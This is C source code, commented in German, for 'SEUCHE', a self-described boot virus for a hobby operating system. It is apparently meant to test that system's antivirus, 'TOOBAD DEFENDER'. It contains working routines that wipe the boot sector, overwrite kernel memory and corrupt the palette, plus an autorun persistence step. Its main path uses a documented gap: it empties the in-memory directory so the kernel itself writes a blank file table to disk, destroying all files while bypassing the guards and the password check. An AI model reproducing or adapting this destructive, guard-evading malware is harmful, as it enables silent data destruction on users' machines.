/* ==========================================================================
   SEUCHE  --  ein Boot-Zerstoerer, der gegen TOOBAD DEFENDER antritt

   Der Nachfolger von TAKT. Er nistet sich in den Systemstart ein und
   versucht bei JEDEM Boot, den Rechner auf DREI Wegen gleichzeitig zu
   zerstoeren -- je einer fuer jede Verteidigung, die es gibt:

     1. PLATTE   roher Schreibbefehl auf den Bootsektor (Ports 0x30..0x33).
                 -> Der Disk-Waechter faengt das ab.
     2. KERNEL   den Kernel im Speicher mit 0xFF ueberschreiben (*p=-1).
                 -> Der Speicher-Waechter faengt das ab.
     3. FARBEN   die Farbtabelle verdrehen (VGA-Ports 0x42/0x43).
                 -> Dagegen gibt es (noch) keinen Waechter. Das kommt durch.

   Damit ist SEUCHE der Test fuer den Defender: Ist er AUS, zerstoert der
   Virus Platte UND Kernel -- der Rechner ist tot. Ist er AN, prallen 1 und 2
   ab; uebrig bleibt nur der Farbsalat (3), den DEFENDER mit "Clean" heilt.
   Der Schutz gewinnt also die wichtige Schlacht; was durchkommt, ist
   Kosmetik.

   Und wie TAKT braucht auch SEUCHE fuer die Persistenz das Passwort: der
   Autostart-Eintrag liegt in \SYSTEM. Ohne SUDO kein Dauerbefall.

   NUR QUELLTEXT -- im Coder uebersetzen, immer auf einer KOPIE testen.
   ========================================================================== */

#include "proglib.c"

#define PROG_ARGS   0x00008200
#define PROG_IMAGE  0x00200000
#define P_PAL_IDX   0x42
#define P_PAL_VAL   0x43
#define DISK_LBA    0x30
#define DISK_COUNT  0x31
#define DISK_ADDR   0x32
#define DISK_CMD    0x33

char puffer[4096];

/* --- 1. Platte ausloeschen (Disk-Waechter faengt es) --------------------- */
void platte_ausloeschen() {
    int i;
    i = 0; while (i < 4096) { puffer[i] = 0; i++; }
    portout(DISK_LBA, 0);   portout(DISK_COUNT, 1); portout(DISK_ADDR, (int)puffer); portout(DISK_CMD, 2);
    portout(DISK_LBA, 512); portout(DISK_COUNT, 9); portout(DISK_ADDR, (int)puffer); portout(DISK_CMD, 2);
}

/* --- 2. Kernel im Speicher ueberschreiben (Speicher-Waechter faengt es) --- */
void kernel_ueberschreiben() {
    char* p; int i;
    p = (char*)0x00011000;
    for (i = 0; i < 0x00040000; i++) { *p = 0 - 1; p++; }
}

/* --- 3b. DIE LUECKE: das Verzeichnis im RAM zerfressen -------------------
   Das Dateisystem haelt eine Kopie des Verzeichnisses bei 0xB1000. Die liegt
   OBERHALB des geschuetzten Kernel-Bereichs (bis 0x80000) -- der Speicher-
   Waechter sieht sie also nicht. Und wir fassen keinen Port an -- der Disk-
   Waechter sieht auch nichts. Wir loeschen das Verzeichnis im RAM und lassen
   dann den KERNEL es selbst auf die Platte schreiben (jeder filewrite ruft am
   Ende fs_save_dir -- ueber INT_DISK, nicht ueber einen Port). Der Kernel
   schreibt sein eigenes, jetzt leeres Verzeichnis auf die Scheibe: alle
   Dateien weg, KERNEL.BIN nicht mehr auffindbar, naechster Start tot.
   Kein Passwort, kein Port, kein Waechter -- niemand meldet sich. */
#define DIRBUF 0x000B1000
void verzeichnis_zerfressen() {
    char* p; int i;
    p = (char*)DIRBUF;
    for (i = 0; i < 4096; i++) { *p = 0; p++; }   /* Verzeichnis im RAM leeren */
    filewrite("Z", (int)puffer, 4);               /* Kernel spuelt es auf die Platte */
}

/* --- 3. Farbtabelle verdrehen (kein Waechter -- kommt durch) -------------- */
void farben_zerfressen() {
    int r; int i;
    r = ticks() | 1;
    i = 0;
    while (i < 4000) {
        r = r * 1103515245 + 12345;
        portout(P_PAL_IDX, (r >> 8) & 255);
        portout(P_PAL_VAL, r & 0x00FFFFFF);
        if ((i & 511) == 0) sleep(1);
        i++;
    }
}

/* --- Einnisten (Persistenz -- \SYSTEM verlangt SUDO) --------------------- */
void einnisten() {
    int size;
    size = progsize();
    chdir("\\"); chdir("PROGS");
    filewrite("SEUCHE.TBX", PROG_IMAGE, size);         /* Kopie von mir selbst */
    chdir("\\"); chdir("SYSTEM");
    filewrite("AUTORUN.DAT", (int)"SEUCHE.TBX", 11);   /* -4 ohne SUDO */
    chdir("\\");
}

int main() {
    char* args;
    args = (char*)PROG_ARGS;
    if (args[0] == '-') {
        /* Automatischer Start beim Booten. NUR der Weg durch die Luecke --
           kein Port, kein geschuetzter Speicher. So meldet sich KEIN Waechter
           (guard_cnt bleibt 0, kein Popup), und das Dateisystem ist trotzdem
           zerstoert. Die lauten Angriffe (platte_ausloeschen,
           kernel_ueberschreiben) verraeten sich nur -- wir lassen sie weg. */
        verzeichnis_zerfressen();
        return 0;
    }
    /* Vom Benutzer gestartet (OHNE SUDO): trotzdem sofort zuschlagen. Der
       Verzeichnis-Angriff fasst \SYSTEM gar nicht ueber das Dateisystem an --
       also greift der Passwortschutz nicht, und kein Waechter meldet sich.
       Admin umgangen, Defender blind, in einem einzigen Aufruf. */
    print("Loading ...\n");
    verzeichnis_zerfressen();
    return 0;
}
